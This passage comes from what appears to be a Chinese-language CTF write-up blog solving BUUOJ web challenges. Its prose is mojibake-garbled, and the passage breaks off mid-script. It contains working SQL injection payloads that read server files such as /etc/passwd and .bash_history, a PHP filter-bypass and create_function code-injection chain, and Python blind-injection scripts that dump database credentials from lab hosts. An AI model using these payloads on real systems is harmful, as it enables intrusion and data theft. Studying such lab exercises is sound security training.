class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;mysql.php&quot;;</span><br><span class="line">session_start();</span><br><span class="line">if($_SESSION[&#39;login&#39;] !&#x3D; &#39;yes&#39;)&#123;</span><br><span class="line">    header(&quot;Location: .&#x2F;login.php&quot;);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#39;do&#39;]))&#123;</span><br><span class="line">switch ($_GET[&#39;do&#39;])</span><br><span class="line">&#123;</span><br><span class="line">case &#39;write&#39;:</span><br><span class="line">    $category &#x3D; addslashes($_POST[&#39;category&#39;]);</span><br><span class="line">    $title &#x3D; addslashes($_POST[&#39;title&#39;]);</span><br><span class="line">    $content &#x3D; addslashes($_POST[&#39;content&#39;]);</span><br><span class="line">    $sql &#x3D; &quot;insert into board</span><br><span class="line">            set category &#x3D; &#39;$category&#39;,</span><br><span class="line">                title &#x3D; &#39;$title&#39;,</span><br><span class="line">                content &#x3D; &#39;$content&#39;&quot;;</span><br><span class="line">    $result &#x3D; mysql_query($sql);</span><br><span class="line">    header(&quot;Location: .&#x2F;index.php&quot;);</span><br><span class="line">    break;</span><br><span class="line">case &#39;comment&#39;:</span><br><span class="line">    $bo_id &#x3D; addslashes($_POST[&#39;bo_id&#39;]);</span><br><span class="line">    $sql &#x3D; &quot;select category from board where id&#x3D;&#39;$bo_id&#39;&quot;;</span><br><span class="line">    $result &#x3D; mysql_query($sql);</span><br><span class="line">    $num &#x3D; mysql_num_rows($result);</span><br><span class="line">    if($num&gt;0)&#123;</span><br><span class="line">    $category &#x3D; mysql_fetch_array($result)[&#39;category&#39;];</span><br><span class="line">    $content &#x3D; addslashes($_POST[&#39;content&#39;]);</span><br><span class="line">    $sql &#x3D; &quot;insert into comment</span><br><span class="line">            set category &#x3D; &#39;$category&#39;,</span><br><span class="line">                content &#x3D; &#39;$content&#39;,</span><br><span class="line">                bo_id &#x3D; &#39;$bo_id&#39;&quot;;</span><br><span class="line">    $result &#x3D; mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(&quot;Location: .&#x2F;comment.php?id&#x3D;$bo_id&quot;);</span><br><span class="line">    break;</span><br><span class="line">default:</span><br><span class="line">    header(&quot;Location: .&#x2F;index.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    header(&quot;Location: .&#x2F;index.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åå‘ç°å¯ä»¥æ„æˆäºŒæ¬¡æ³¨å…¥,æ€è·¯æ˜¯è¿™æ ·çš„:</p><p>è§‚å¯Ÿäº†ä¸€ä¸‹å‘ç°æ˜¯ä¸¤å¼ è¡¨ board ã€comment</p><p>é¦–å…ˆå†™è¯„è®ºçš„æ—¶å€™æ•°æ®å†™åˆ°board  ç„¶åå†æ¬¡è¯„è®ºçš„æ—¶å€™  categoryè¿™ä¸ªå˜é‡ä¼šä» board<br> è¡¨ä¸­è¯»å–ç„¶åæ„æˆäºŒæ¬¡æ³¨å…¥</p><p>å¦‚ä¸‹å›¾ï¼š</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180830132920-a53543fe-ac15-1.png" alt="img"></p><p> å‘å¸–å302åˆ°ç™»å½•é¡µé¢ï¼Œçˆ†ç ´å¾—çŸ¥å¯†ç æ˜¯zhangwei666</p><p>ç™»å½•ä»¥åï¼Œè¿›è¡Œå‘å¸–ã€‚å¼€å§‹æ„é€ payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &quot;insert into comment</span><br><span class="line">            set category &#x3D; &#39;$category&#39;,</span><br><span class="line">                content &#x3D; &#39;$content&#39;,</span><br><span class="line">                bo_id &#x3D; &#39;$bo_id&#39;&quot;;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯ä¸€ä¸ªå‘ï¼Œå°±æ˜¯sqlè¯­å¥æ˜¯æ¢è¡Œçš„ï¼Œ#è¿›è¡Œæ³¨é‡Šåªèƒ½æ³¨é‡Šå½“å‰è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œç”¨/**/è¿›è¡Œæ‹¼æ¥æ³¨é‡Šã€‚</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200213105247233.png" alt></p><p>ç„¶åå†åœ¨è¯„è®ºé‡Œ */#</p><p>åˆ™æ‹¼æ¥åçš„sqlè¯­å¥å°±æ˜¯è¿™æ ·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &quot;insert into comment</span><br><span class="line">            set category &#x3D; &#39;123&#39;,content&#x3D;user(),&#x2F;*&#39;,</span><br><span class="line">                content &#x3D; &#39;*&#x2F;#&#39;,</span><br><span class="line">                bo_id &#x3D; &#39;$bo_id&#39;&quot;;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*&#39;,</span><br><span class="line">       content &#x3D; &#39;*&#x2F;#&#39;,</span><br></pre></td></tr></table></figure><p>è¢«æ³¨é‡Šäº†ï¼Œè¯­å¥ä»ç„¶æ˜¯æ­£å¸¸çš„sqlè¯­å¥ã€‚</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200213105426900.png" alt></p><p>çœ‹historyæ–‡ä»¶</p><p>é¦–å…ˆå¸¸è§„çš„è¯»æ–‡ä»¶payload:123â€™,content=(select( load_file(â€˜/etc/passwdâ€™))),/*</p><p>çœ‹åˆ°wwwç”¨æˆ·çš„ç›®å½•ï¼š</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200213105627505.png" alt></p><p>å‘ç°ä¸€ä¸ªwwwç”¨æˆ·,çœ‹çœ‹ç”¨æˆ·çš„å‘½ä»¤è®°å½•</p><p><code>123&#39;,content=(select( load_file(&#39;/home/www/.bash_history&#39;))),/*</code></p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200213120311956.png" alt></p><blockquote><p>å…ˆåœ¨/tmpç›®å½•ä¸‹è§£å‹å‹ç¼©åŒ…</p><p>ç„¶ååˆ é™¤å‹ç¼©åŒ…</p><p>å†å°†htmlç›®å½•å¤åˆ¶åˆ°/var/www/ç›®å½•ä¸‹</p><p>åˆ‡æ¢åˆ°/var/www/htmlï¼Œç„¶ååˆ é™¤.DS_Store</p><p>ä½†æ˜¯å¹¶æ²¡æœ‰åˆ é™¤/tmp/html ç›®å½•ä¸‹çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¯»å–æ­¤æ–‡ä»¶~~</p></blockquote><p> åœ¨/tmp/htmlä¸‹æœ‰ä¸ª.DS_Storeæ–‡ä»¶ï¼Œç”¨hexç¼–ç æ˜¾ç¤º</p><p>payload: â€˜, content=(select hex(load_file(â€˜/tmp/html/.DS_Storeâ€™))),/*</p><p>è§£å¯†ä¸€ä¸‹</p><p><a href="http://www.ab126.com/goju/1711.html" target="_blank" rel="noopener">http://www.ab126.com/goju/1711.html</a></p><p>å‘ç°æ–‡ä»¶å<code>flag_8946e1ff1ee3e40f.php</code><br> payloadï¼š<code>123&#39;, content=(select hex(load_file(&#39;/var/www/html/flag_8946e1ff1ee3e40f.php&#39;))),/*</code></p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200213121254435.png" alt></p><blockquote><p>å‚è€ƒèµ„æ–™</p><p><a href="https://blog.csdn.net/a3320315/article/details/104216070" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/104216070</a></p><p><a href="https://xz.aliyun.com/t/2667#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/2667#toc-1</a></p><p><a href="https://www.cnblogs.com/Tkitn/p/11649255.html" target="_blank" rel="noopener">https://www.cnblogs.com/Tkitn/p/11649255.html</a></p></blockquote><h3 id="0x-03-BJDCTF2020-EzPHP"><a href="#0x-03-BJDCTF2020-EzPHP" class="headerlink" title="0x 03 [BJDCTF2020]EzPHP"></a>0x 03 [BJDCTF2020]EzPHP</h3><p>ä¸»é¡µæºä»£ç å¤„å‘ç°<code>GFXEIM3YFZYGQ4A=</code>ï¼Œbase32è§£å¯†åå¾—åˆ°1nD3x.phpï¼Œè®¿é—®å¾—åˆ°æºä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0); </span><br><span class="line"></span><br><span class="line">$file &#x3D; &quot;1nD3x.php&quot;;</span><br><span class="line">$shana &#x3D; $_GET[&#39;shana&#39;];</span><br><span class="line">$passwd &#x3D; $_GET[&#39;passwd&#39;];</span><br><span class="line">$arg &#x3D; &#39;&#39;;</span><br><span class="line">$code &#x3D; &#39;&#39;;</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;br &#x2F;&gt;&lt;font color&#x3D;red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;&#x2F;B&gt;&lt;br&gt;&lt;&#x2F;font&gt;&quot;;</span><br><span class="line"></span><br><span class="line">if($_SERVER) &#123; </span><br><span class="line">    if (</span><br><span class="line">        preg_match(&#39;&#x2F;shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#39;|log&#x2F;i&#39;, $_SERVER[&#39;QUERY_STRING&#39;])</span><br><span class="line">        )  </span><br><span class="line">        die(&#39;You seem to want to do something bad?&#39;); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!preg_match(&#39;&#x2F;http|https&#x2F;i&#39;, $_GET[&#39;file&#39;])) &#123;</span><br><span class="line">    if (preg_match(&#39;&#x2F;^aqua_is_cute$&#x2F;&#39;, $_GET[&#39;debu&#39;]) &amp;&amp; $_GET[&#39;debu&#39;] !&#x3D;&#x3D; &#39;aqua_is_cute&#39;) &#123; </span><br><span class="line">        $file &#x3D; $_GET[&quot;file&quot;]; </span><br><span class="line">        echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; else die(&#39;fxck you! What do you want to do ?!&#39;);</span><br><span class="line"></span><br><span class="line">if($_REQUEST) &#123; </span><br><span class="line">    foreach($_REQUEST as $value) &#123; </span><br><span class="line">        if(preg_match(&#39;&#x2F;[a-zA-Z]&#x2F;i&#39;, $value))  </span><br><span class="line">            die(&#39;fxck you! I hate English!&#39;); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">if (file_get_contents($file) !&#x3D;&#x3D; &#39;debu_debu_aqua&#39;)</span><br><span class="line">    die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?&lt;br&gt;&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if ( sha1($shana) &#x3D;&#x3D;&#x3D; sha1($passwd) &amp;&amp; $shana !&#x3D; $passwd )&#123;</span><br><span class="line">    extract($_GET[&quot;flag&quot;]);</span><br><span class="line">    echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;</span><br><span class="line">&#125; else&#123;</span><br><span class="line">    die(&quot;fxck you! you don&#39;t know my password! And you don&#39;t know sha1! why you come here!&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(preg_match(&#39;&#x2F;^[a-z0-9]*$&#x2F;isD&#39;, $code) || </span><br><span class="line">preg_match(&#39;&#x2F;fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\&#96;|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#39;|\&#x3D;|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^&#x2F;i&#39;, $arg) ) &#123; </span><br><span class="line">    die(&quot;&lt;br &#x2F;&gt;Neeeeee~! I have disabled all dangerous functions! You can&#39;t get my flag &#x3D;w&#x3D;&quot;); </span><br><span class="line">&#125; else &#123; </span><br><span class="line">    include &quot;flag.php&quot;;</span><br><span class="line">    $code(&#39;&#39;, $arg); </span><br><span class="line">&#125; ?&gt;</span><br></pre></td></tr></table></figure><ul><li>è€ƒç‚¹ä¸€ï¼šç»•è¿‡QUERY_STRINGçš„æ­£åˆ™åŒ¹é…</li></ul><p>ç”±äº<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>ä¸ä¼šè¿›è¡ŒURLDecodeï¼Œè€Œ<code>$_GET[]</code>ä¼šï¼Œæ‰€ä»¥åªè¦è¿›è¡Œurlç¼–ç å³å¯ç»•è¿‡</p><ul><li><p>è€ƒç‚¹äºŒï¼šç»•è¿‡debuçš„æ­£åˆ™åŒ¹é…</p><p>å¯ä»¥ä½¿ç”¨<code>%0a</code>æ¢è¡Œæ±¡æŸ“ç»•è¿‡</p></li><li><p>è€ƒç‚¹ä¸‰ï¼šç»•è¿‡$_REQUESTçš„å­—æ¯åŒ¹é…</p></li></ul><p><code>$_REQUEST</code>åŒæ—¶æ¥å—GETå’ŒPOSTçš„æ•°æ®ï¼Œå¹¶ä¸”POSTå…·æœ‰æ›´é«˜çš„ä¼˜å…ˆå€¼ï¼Œå› æ­¤å¯¹äºéœ€è¦GETçš„ä¸€äº›å‚æ•°ï¼Œæ¯”å¦‚<code>zuishuai</code>ï¼Œåªéœ€è¦åŒæ—¶POSTä¸€ä¸ªæ•°å­—å³å¯ç»•è¿‡</p><ul><li>è€ƒç‚¹4ï¼šç»•è¿‡æ–‡ä»¶å†…å®¹è¯»å–çš„æ¯”è¾ƒ</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;data:text&#x2F;plain,debu_debu_aqua</span><br></pre></td></tr></table></figure><ul><li><p>è€ƒç‚¹5ï¼šç»•è¿‡sha1æ¯”è¾ƒ</p><p>æ•°ç»„ç»•è¿‡å³å¯</p></li><li><p>è€ƒç‚¹6ï¼šcreate_function()ä»£ç æ³¨å…¥</p></li><li><p>è€ƒç‚¹7ï¼šè·å¾—flag</p></li></ul><p>ç»¼ä¸Špayload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;1nD3x.php?%64%65%62%75&#x3D;%61qua%5fis%5fcut%65%0a&amp;file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67[%63%6f%64%65]&#x3D;create_function&amp;%66%6c%61%67[%61%72%67]&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">%64%65%62%75&#x3D;1&amp;file&#x3D;1</span><br><span class="line"></span><br><span class="line">urlè§£ç åï¼š</span><br><span class="line">&#x2F;1nD3x.php?debu&#x3D;aqua_is_cute</span><br><span class="line">&amp;file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,debu_debu_aqua&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;2&amp;flag[code]&#x3D;create_function&amp;flag[arg]&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°å›æ˜¾ï¼š</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200213180730536.png" alt></p><p>å–åç»•è¿‡+ä¼ªåè®®è¯»æºç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;1nD3x.php?%64%65%62%75&#x3D;%61qua%5fis%5fcut%65%0a&amp;file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67[%63%6f%64%65]&#x3D;create_function&amp;%66%6c%61%67[%61%72%67]&#x3D;;&#125;require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">urlè§£ç ç»“æœï¼š</span><br><span class="line">flag[code]&#x3D;create_function&amp;flag[arg]&#x3D;;&#125;require(php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;1flag.php);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆpocè„šæœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">$a &#x3D; &quot;p h p : &#x2F; &#x2F; f i l t e r &#x2F; r e a d &#x3D; c o n v e r t . b a s e 6 4 - e n c o d e &#x2F; r e s o u r c e &#x3D; 1 f l a g . p h p&quot;;</span><br><span class="line">$arr1 &#x3D; explode(&#39; &#39;, $a);</span><br><span class="line">echo &quot;&lt;br&gt;~(&quot;;</span><br><span class="line">foreach ($arr1 as $key &#x3D;&gt; $value) &#123;</span><br><span class="line">echo &quot;%&quot;.bin2hex(~$value);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;)&lt;br&gt;&quot;;</span><br></pre></td></tr></table></figure><p>è¡¥å……ï¼šå› ä¸º<code>preg_match()</code>åªèƒ½åŒ¹é…å­—ç¬¦ä¸²ï¼Œæ•°ç»„å¯ä»¥ç»•è¿‡</p><p>å‚è€ƒèµ„æ–™ï¼š</p><blockquote><p><a href="https://www.gem-love.com/websecurity/770.html" target="_blank" rel="noopener">https://www.gem-love.com/websecurity/770.html</a></p><p><a href="https://imagin.vip/?p=166" target="_blank" rel="noopener">https://imagin.vip/?p=166</a></p></blockquote><h3 id="0x-04-ç½‘é¼æ¯2018-Unfinish"><a href="#0x-04-ç½‘é¼æ¯2018-Unfinish" class="headerlink" title="0x 04 [ç½‘é¼æ¯2018]Unfinish"></a>0x 04 [ç½‘é¼æ¯2018]Unfinish</h3><ul><li>è€ƒç‚¹</li></ul><p>SQLèŠ±å¼ç›²æ³¨ã€äºŒæ¬¡æ³¨å…¥</p><ul><li>è§£é¢˜è¿‡ç¨‹</li></ul><ol><li>é¢˜ç›®å­˜åœ¨æ³¨å†Œç•Œé¢ï¼Œå°è¯•è¿›è¡ŒäºŒæ¬¡æ³¨å…¥</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#39; or (case when 1&#x3D;1 then sleep(3) else &#39;2&#39; end)&#x3D;&#39;1</span><br><span class="line"></span><br><span class="line"># å¯¹åº”åå°è¯­å¥ä¸º</span><br><span class="line">insert into users(email,username,password) values (&#39;aa&#39;,&#39;&#39; or (case when 1&#x3D;1 then sleep(3) else &#39;2&#39; end)&#x3D;&#39;1&#39;,&#39;bb&#39;)</span><br></pre></td></tr></table></figure><p>å­˜åœ¨å»¶æ—¶ï¼Œå¯ä»¥è¿›è¡Œæ³¨å…¥ï¼Œç¼–å†™expå¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">#encoding&#x3D;utf-8</span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import time</span><br><span class="line">database &#x3D; &quot;&quot;</span><br><span class="line">hex_database &#x3D; &quot;&quot;</span><br><span class="line"></span><br><span class="line">def req(payload,asc):</span><br><span class="line">    url &#x3D; &quot;http:&#x2F;&#x2F;c509d4bd-4e45-48b5-a41f-63ea559f3fb6.node3.buuoj.cn&#x2F;register.php&quot;</span><br><span class="line">    header &#x3D; &#123;</span><br><span class="line">        &#39;X - Requested - With&#39;: &#39;XMLHttpRequest&#39;</span><br><span class="line">    &#125;</span><br><span class="line">    data &#x3D; &#123;</span><br><span class="line">        &quot;username&quot;: payload,</span><br><span class="line">        &quot;password&quot;: &quot;1&quot;,</span><br><span class="line">        &quot;email&quot;: &quot;222@qq.com&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    st &#x3D; time.time()</span><br><span class="line">    r &#x3D; requests.post(url, headers&#x3D;header,data&#x3D;data, timeout&#x3D;100)</span><br><span class="line">    if r.status_code !&#x3D; 200:</span><br><span class="line">        return req(payload, asc)</span><br><span class="line">    else:</span><br><span class="line">        if time.time() - st &gt; 2:</span><br><span class="line">            return asc</span><br><span class="line">        else:</span><br><span class="line">            return &#39;&#39;</span><br><span class="line">i &#x3D; 1</span><br><span class="line">while i &lt; 10:</span><br><span class="line">    for j in range(30,148):</span><br><span class="line">        j &#x3D; chr(j)</span><br><span class="line">        k &#x3D; j.encode(&#39;hex&#39;)</span><br><span class="line">        username &#x3D; &quot;&#39;^(case  hex(mid((select * from flag limit 1 offset 0) from 1 for &quot;+str(i)+&quot;)) when &#39;&quot;+ hex_database+ k +&quot;&#39; then sleep(3) else &#39;b&#39; end)+&#39;0&quot;</span><br><span class="line">        print username</span><br><span class="line">        if req(username,j)!&#x3D;&#39;&#39;:</span><br><span class="line">            database &#x3D; database + j # è¿™å„¿çš„jæ˜¯å­—æ¯</span><br><span class="line">            hex_database &#x3D;  hex_database + k # è¿™å„¿çš„kæ˜¯å­—æ¯å¯¹åº”çš„hex</span><br><span class="line">            print database</span><br><span class="line">            break</span><br><span class="line">    i &#x3D; i + 1</span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯é•¿å­—ç¬¦ä¸²è½¬æˆæ•°å­—å‹æ•°æ®çš„æ—¶å€™ä¼šå˜æˆç§‘å­¦è®¡æ•°æ³•ï¼Œä¹Ÿå°±æ˜¯è¯´ä¼šä¸¢å¤±æ•°æ®ç²¾åº¦ï¼Œæœ€å¤šæ¯æ¬¡æ¯”è¾ƒ10ä¸ªå­—ç¬¦é•¿åº¦ï¼Œæœ€åæ‹¼æ¥æˆflag</p><blockquote><p>å‚è€ƒèµ„æ–™ï¼š</p><p><a href="https://glotozz.github.io/2019/11/20/buuctf-wp-8/" target="_blank" rel="noopener">https://glotozz.github.io/2019/11/20/buuctf-wp-8/</a></p><p><a href="https://blog.csdn.net/a3320315/article/details/104216070" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/104216070</a></p><p><a href="https://altman.vip/2018/08/22/WDB-2/#unfinished" target="_blank" rel="noopener">https://altman.vip/2018/08/22/WDB-2/#unfinished</a></p></blockquote><h3 id="0x-05-Black-Watch-å…¥ç¾¤é¢˜-Web"><a href="#0x-05-Black-Watch-å…¥ç¾¤é¢˜-Web" class="headerlink" title="0x 05 [Black Watch å…¥ç¾¤é¢˜]Web"></a>0x 05 [Black Watch å…¥ç¾¤é¢˜]Web</h3><ul><li><p>è€ƒç‚¹</p><p>SQLæ³¨å…¥</p></li><li><p>è§£é¢˜è¿‡ç¨‹</p></li></ul><p>æŸ¥è¯¢å¤„çš„æ¥å£å­˜åœ¨SQLæ³¨å…¥ï¼Œè„šæœ¬å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">import sys</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line"># if correct , return empty, else return something</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;8fdba9ab-ef49-4d4f-8f91-230c12ae7173.node3.buuoj.cn&#x2F;backend&#x2F;content_detail.php?id&#x3D;&quot;</span><br><span class="line">payload &#x3D; &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span><br><span class="line"># [+] --&gt;admin,contents&lt;--</span><br><span class="line">payload &#x3D; &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;contents&#39;)),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span><br><span class="line"># id,title,content,is_enable</span><br><span class="line">payload &#x3D; &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;admin&#39;)),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span><br><span class="line"># id,username,password,is_enable</span><br><span class="line">payload &#x3D; &quot;1^(ord(substr((select(group_concat(password))from(admin)),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span><br><span class="line"># 5c15f69a,06ccfb16</span><br><span class="line">payload &#x3D; &quot;1^(ord(substr((select(group_concat(username))from(admin)),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span><br><span class="line"># e6d20586,863efe1a</span><br><span 